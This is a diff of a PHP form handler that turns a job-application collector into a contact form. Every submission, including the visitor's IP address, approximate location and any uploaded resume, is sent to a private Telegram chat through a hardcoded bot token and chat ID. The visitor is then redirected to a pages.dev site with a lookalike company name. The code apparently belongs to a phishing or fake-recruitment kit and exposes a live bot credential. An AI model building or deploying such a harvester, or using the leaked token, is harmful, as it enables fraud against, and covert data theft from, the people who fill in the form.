@@ -3,11 +3,12 @@
 $botToken = "7676566666:AAE0DP1B693BxiMqCQ0IIxjWyLcnAueevk8";
 $chatId   = "907528874";
 
-// Get form fields
-$fullname = $_POST['fullname'] ?? '';
+// Get form fields (matching your IDs/names)
+$name     = $_POST['name'] ?? '';
 $email    = $_POST['email'] ?? '';
-$phone    = $_POST['phone'] ?? '';
-$desc     = $_POST['desc'] ?? '';
+$company  = $_POST['company'] ?? '';
+$subject  = $_POST['subject'] ?? '';
+$message  = $_POST['message'] ?? '';
 
 // Grab IP + location
 $ip = $_SERVER['REMOTE_ADDR'];
@@ -23,14 +24,15 @@ if ($response) {
     $location = "$city, $state $zip";
 }
 
-// Format message
-$message = "
-📄 New Job Application
+// Format Telegram message
+$text = "
+📄 New Form Submission
 ------------------------
-👤 Name: $fullname
+👤 Name: $name
 📧 Email: $email
-📞 Phone: $phone
-📝 Cover Letter: $desc
+🏢 Company: $company
+📌 Subject: $subject
+📝 Message: $message
 
 🌍 IP: $ip
 🏙️ Location: $location
@@ -39,10 +41,10 @@ $message = "
 // Send text message first
 file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?" . http_build_query([
     'chat_id' => $chatId,
-    'text'    => $message
+    'text'    => $text
 ]));
 
-// Handle resume upload
+// Handle file upload if there's an attachment (optional)
 if (isset($_FILES['resume']) && $_FILES['resume']['error'] === UPLOAD_ERR_OK) {
     $filePath = $_FILES['resume']['tmp_name'];
     $fileName = $_FILES['resume']['name'];
@@ -62,6 +64,6 @@ if (isset($_FILES['resume']) && $_FILES['resume']['error'] === UPLOAD_ERR_OK) {
 }
 
 // Redirect after success
-header("Location: https://veristappathsolution.pages.dev/lamina");
+header("Location: https://veritaspathsolutions.pages.dev/Home");
 exit;
 ?>
